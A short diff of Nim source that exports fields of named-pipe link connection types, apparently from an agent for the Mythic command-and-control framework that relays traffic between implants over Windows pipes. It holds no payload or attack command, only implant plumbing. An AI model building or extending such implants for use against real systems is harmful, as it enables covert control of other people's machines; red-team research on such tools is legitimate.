@@ -51,27 +51,27 @@ type
   LinkConnectionObj = object
     agentUuid: string
     pipeHandle: HANDLE
-    active: bool
-    receivedEof: bool  # True when reader thread sends empty seq EOF signal
+    active*: bool
+    receivedEof*: bool  # True when reader thread sends empty seq EOF signal
     edgeRemovalSent: bool  # True after edge removal has been sent (2-phase)
     readerReady: bool  # True when reader thread is ready and waiting on ReadFile
-    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Pipe
+    inChannel*: ptr Channel[seq[byte]]   # Mythic → Writer → Pipe
     outChannel: ptr Channel[seq[byte]]  # Pipe → Reader → Mythic
     readerThread: Thread[ptr LinkConnectionObj]
     writerThread: Thread[ptr LinkConnectionObj]
   
-  LinkConnection = ref object
-    agentUuid: string
-    pipeHandle: HANDLE
-    active: bool
-    receivedEof: bool
+  LinkConnection* = ref object
+    agentUuid*: string
+    pipeHandle*: HANDLE
+    active*: bool
+    receivedEof*: bool
     edgeRemovalSent: bool
     readerReady: bool
-    inChannel: ptr Channel[seq[byte]]
+    inChannel*: ptr Channel[seq[byte]]
     outChannel: ptr Channel[seq[byte]]
     readerThread: Thread[ptr LinkConnectionObj]
     writerThread: Thread[ptr LinkConnectionObj]
-    sharedPtr: ptr LinkConnectionObj  # Stable pointer for threads
+    sharedPtr*: ptr LinkConnectionObj  # Stable pointer for threads
 
 var
   activeLinkConnections* {.threadvar.}: Table[string, LinkConnection]
